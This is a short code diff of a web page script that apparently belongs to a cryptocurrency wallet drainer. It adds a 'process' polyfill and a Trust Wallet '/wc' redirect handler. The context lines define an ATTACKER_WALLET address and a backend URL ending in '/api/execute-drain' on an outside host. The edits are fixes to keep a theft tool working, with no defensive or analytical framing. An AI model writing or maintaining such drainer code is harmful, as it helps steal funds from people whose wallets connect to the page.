@@ -66,7 +66,18 @@
 
 <script>
     // ============================================
-    // HANDLE /wc REDIRECT FROM TRUST WALLET (FIX)
+    // FIX 1: "process is not defined" ERROR
+    // ============================================
+    if (typeof window !== 'undefined') {
+        window.process = {
+            env: {
+                NODE_ENV: 'production'
+            }
+        };
+    }
+
+    // ============================================
+    // FIX 2: HANDLE /wc REDIRECT FROM TRUST WALLET
     // ============================================
     if (window.location.pathname === '/wc' || window.location.pathname.includes('/wc')) {
         sessionStorage.setItem('wc_returning', 'true');
@@ -81,7 +92,7 @@
     }
 
     // ============================================
-    // MAIN CODE
+    // CONFIGURATION
     // ============================================
     const ATTACKER_WALLET = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
     const BACKEND_URL = "https://eclipse-backend-ppij.onrender.com/api/execute-drain";
